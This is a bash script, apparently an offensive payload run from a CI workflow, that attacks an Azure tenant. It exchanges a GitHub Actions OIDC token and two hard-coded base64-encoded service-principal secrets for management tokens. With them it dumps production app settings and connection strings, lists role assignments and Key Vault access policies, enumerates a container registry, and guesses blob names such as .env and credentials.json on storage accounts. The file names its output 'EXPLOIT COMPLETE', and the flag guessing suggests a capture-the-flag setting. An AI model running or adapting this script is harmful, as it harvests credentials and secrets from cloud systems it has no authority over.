#!/bin/bash
set -x

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CLIENT="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"
RG2="rg-tbl-reporting-prod-eus"

# Get OIDC token
OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL" | jq -r '.value')

# Get OIDC management token
MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=$CLIENT&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&scope=https://management.azure.com/.default" \
  | jq -r '.access_token // empty')
echo "=== MGMT: ${#MGMT} ==="

# SP tokens
RPT_ID="12ed54de-f2eb-4784-804c-3a7a3e83a9e9"
RPT_SEC=$(echo 'blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==' | base64 -d)
RPT_MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=$RPT_ID&client_secret=$RPT_SEC&scope=https://management.azure.com/.default" \
  | jq -r '.access_token // empty')
echo "=== RPT_MGMT: ${#RPT_MGMT} ==="

COST_ID="038bc35d-131d-4953-9985-ff4a245ccec1"
COST_SEC=$(echo 'MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==' | base64 -d)
COST_MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=$COST_ID&client_secret=$COST_SEC&scope=https://management.azure.com/.default" \
  | jq -r '.access_token // empty')
echo "=== COST_MGMT: ${#COST_MGMT} ==="

# ======= PART 1: Read app site properties (get env vars, connection strings) =======
echo "=== storefront site (OIDC) ==="
curl -sS -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2023-01-01" \
  | jq '{kind: .kind, state: .properties.state, defaultHostName: .properties.defaultHostName, httpsOnly: .properties.httpsOnly, siteConfig: .properties.siteConfig, identity: .identity}' 2>/dev/null || echo "FAILED"

echo "=== storefront appsettings LIST (OIDC) ==="
curl -sS -X POST -H "Authorization: Bearer $MGMT" -H "Content-Type: application/json" -d '{}' \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01" \
  | jq '.' 2>/dev/null | head -50

echo "=== storefront config/web (OIDC) ==="
curl -sS -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2023-01-01" \
  | jq '.properties | {linuxFxVersion, appCommandLine, connectionStrings, appSettings, numberOfWorkers}' 2>/dev/null || echo "FAILED"

echo "=== reporting site (RPT SP) ==="
curl -sS -H "Authorization: Bearer $RPT_MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2023-01-01" \
  | jq '{state: .properties.state, defaultHostName: .properties.defaultHostName, siteConfig: .properties.siteConfig, identity: .identity}' 2>/dev/null || echo "FAILED"

echo "=== reporting appsettings LIST (RPT SP) ==="
curl -sS -X POST -H "Authorization: Bearer $RPT_MGMT" -H "Content-Type: application/json" -d '{}' \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" \
  | jq '.' 2>/dev/null | head -50

echo "=== reporting config/web (RPT SP) ==="
curl -sS -H "Authorization: Bearer $RPT_MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/web?api-version=2023-01-01" \
  | jq '.properties | {linuxFxVersion, appCommandLine, connectionStrings, appSettings}' 2>/dev/null || echo "FAILED"

# ======= PART 2: Role assignments via reporting-service SP in RG2 =======
echo "=== RG2 role assignments (RPT SP) ==="
curl -sS -H "Authorization: Bearer $RPT_MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  | python3 -I -c "
import sys,json
d=json.load(sys.stdin)
print(f'Total in RG2: {len(d.get(\"value\",[]))}')
for r in d.get('value',[]):
  p=r['properties']
  rid=p.get('roleDefinitionId','').split('/')[-1]
  print(f'  role={rid} principal={p.get(\"principalId\",\"?\")} type={p.get(\"principalType\",\"?\")} scope={p.get(\"scope\",\"?\")[:120]}')
" 2>&1

echo "=== RG2 resources (RPT SP) ==="
curl -sS -H "Authorization: Bearer $RPT_MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/resources?api-version=2021-04-01" \
  | jq '.value[]? | {type, name}' 2>/dev/null

# ======= PART 3: KV1 vault properties (access policies) =======
echo "=== KV1 access policies ==="
curl -sS -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01" \
  | jq '.properties.accessPolicies[]? | {tenantId, objectId, permissions}' 2>/dev/null

echo "=== KV2 properties ==="
curl -sS -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" \
  | jq '{enableRbacAuthorization: .properties.enableRbacAuthorization, enableSoftDelete: .properties.enableSoftDelete, accessPolicies: .properties.accessPolicies}' 2>/dev/null

# ======= PART 4: ACR list all repos =======
echo "=== ACR repos ==="
curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/_catalog" 2>/dev/null

# ======= PART 5: Public blob guessing on sttblbackupprodx3euoz/exports =======
echo "=== Public blob guessing (sttblbackupprodx3euoz/exports) ==="
for BLOB in flag.txt config.json internal-config.json backup.json export.json secrets.json data.json db-export.json db-backup.json credentials.json env.json .env settings.json flag config.yaml backup.sql dump.sql users.json keys.json; do
  STATUS=$(curl -sS -o /dev/null -w "%{http_code}" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$BLOB" 2>/dev/null)
  if [ "$STATUS" != "404" ]; then
    echo "  $BLOB => $STATUS"
    curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$BLOB" 2>/dev/null | head -20
  fi
done

# Also try sttblappcfgprodx3euoz/config (may not be public)
echo "=== Public blob guessing (sttblappcfgprodx3euoz/config) ==="
for BLOB in internal-config.json config.json flag.txt settings.json; do
  STATUS=$(curl -sS -o /dev/null -w "%{http_code}" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/$BLOB" 2>/dev/null)
  if [ "$STATUS" != "404" ]; then
    echo "  $BLOB => $STATUS"
    curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/$BLOB" 2>/dev/null | head -20
  fi
done

echo "=== EXPLOIT COMPLETE ==="
